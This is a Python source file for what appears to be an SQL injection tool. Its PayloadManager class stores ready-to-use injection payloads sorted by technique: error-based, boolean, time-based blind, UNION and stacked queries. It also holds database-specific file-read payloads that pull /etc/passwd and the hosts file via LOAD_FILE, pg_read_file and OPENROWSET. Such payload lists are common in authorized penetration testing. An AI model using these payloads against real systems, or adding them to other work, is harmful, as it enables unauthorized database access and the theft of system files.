#!/usr/bin/env python3

from typing import Dict, List, Optional
import json
import os

class PayloadManager:
    def __init__(self, payload_file: Optional[str] = None):
        """
        Initialize the PayloadManager with optional custom payload file.
        
        Args:
            payload_file: Path to custom payload JSON file
        """
        self.payloads = {
            "error_based": [
                "'",
                "''",
                "\"",
                "\"\"",
                "1' OR '1'='1",
                "1\" OR \"1\"=\"1",
                "' OR 1=1--",
                "\" OR 1=1--",
                "' OR '1'='1'--",
                "1' ORDER BY 1--",
                "1' ORDER BY 2--",
                "1' ORDER BY 3--",
            ],
            "boolean_based": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR 1=1--",
                "' OR 1=2--",
            ],
            "time_based": [
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND (SELECT * FROM (SELECT(BENCHMARK(10000000,MD5(1))))a)--",
            ],
            "union_based": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
            ],
            "stacked_queries": [
                "'; SELECT 1--",
                "'; SELECT 1,2--",
                "'; SELECT 1,2,3--",
            ],
            "file_operations": {
                "mysql": [
                    "' UNION SELECT LOAD_FILE('/etc/passwd')--",
                    "' UNION SELECT LOAD_FILE('/etc/hosts')--",
                ],
                "postgresql": [
                    "' UNION SELECT pg_read_file('/etc/passwd')--",
                    "' UNION SELECT pg_read_file('/etc/hosts')--",
                ],
                "mssql": [
                    "' UNION SELECT BulkColumn FROM OPENROWSET(BULK 'C:\\Windows\\System32\\drivers\\etc\\hosts', SINGLE_BLOB) AS x--",
                ]
            }
        }
        
        # Load custom payloads if provided
        if payload_file and os.path.exists(payload_file):
            self.load_custom_payloads(payload_file)
    
    def load_custom_payloads(self, payload_file: str) -> None:
        """
        Load custom payloads from a JSON file.
        
        Args:
            payload_file: Path to JSON file containing custom payloads
        """
        try:
            with open(payload_file, 'r') as f:
                custom_payloads = json.load(f)
                self.payloads.update(custom_payloads)
        except Exception as e:
            print(f"Error loading custom payloads: {str(e)}")
    
    def get_payloads(self, category: str) -> List[str]:
        """
        Get payloads for a specific category.
        
        Args:
            category: Payload category (error_based, boolean_based, etc.)
            
        Returns:
            List of payloads for the specified category
        """
        return self.payloads.get(category, [])
    
    def get_database_specific_payloads(self, db_type: str, category: str) -> List[str]:
        """
        Get database-specific payloads for a category.
        
        Args:
            db_type: Database type (mysql, postgresql, mssql)
            category: Payload category
            
        Returns:
            List of database-specific payloads
        """
        if category in self.payloads and isinstance(self.payloads[category], dict):
            return self.payloads[category].get(db_type, [])
        return []
    
    def add_payload(self, category: str, payload: str) -> None:
        """
        Add a new payload to a category.
        
        Args:
            category: Payload category
            payload: New payload to add
        """
        if category not in self.payloads:
            self.payloads[category] = []
        self.payloads[category].append(payload)
    
    def add_database_specific_payload(self, db_type: str, category: str, payload: str) -> None:
        """
        Add a database-specific payload.
        
        Args:
            db_type: Database type
            category: Payload category
            payload: New payload to add
        """
        if category not in self.payloads:
            self.payloads[category] = {}
        if db_type not in self.payloads[category]:
            self.payloads[category][db_type] = []
        self.payloads[category][db_type].append(payload)
    
    def save_payloads(self, output_file: str) -> None:
        """
        Save current payloads to a JSON file.
        
        Args:
            output_file: Path to output JSON file
        """
        try:
            with open(output_file, 'w') as f:
                json.dump(self.payloads, f, indent=4)
        except Exception as e:
            print(f"Error saving payloads: {str(e)}") 
